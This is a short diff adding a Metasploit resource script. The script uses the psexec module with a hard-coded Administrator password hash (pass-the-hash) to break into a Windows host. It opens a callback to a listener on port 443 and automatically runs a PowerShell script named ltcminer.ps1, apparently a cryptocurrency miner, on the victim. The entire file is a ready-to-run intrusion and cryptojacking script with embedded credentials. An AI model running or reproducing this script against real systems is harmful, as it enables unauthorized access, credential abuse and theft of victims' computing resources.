@@ -1,0 +1,10 @@
+#place ltcminer.ps1 in the folder and update the path for script. http://10.173.118.33/ltcminer.ps1
+set AutoRunScript post/windows/manage/exec_powershell
+setg SCRIPT /home/prajwal/work/ltcminer.ps1
+use exploit/windows/smb/psexec
+set LHOST 10.173.119.179
+set LPORT 443
+set RHOST 10.173.118.33
+set SMBUser Administrator
+set SMBPass aad3b435b51404eeaad3b435b51404ee:b2568aaa902caf959388cfdfee966c10
+exploit
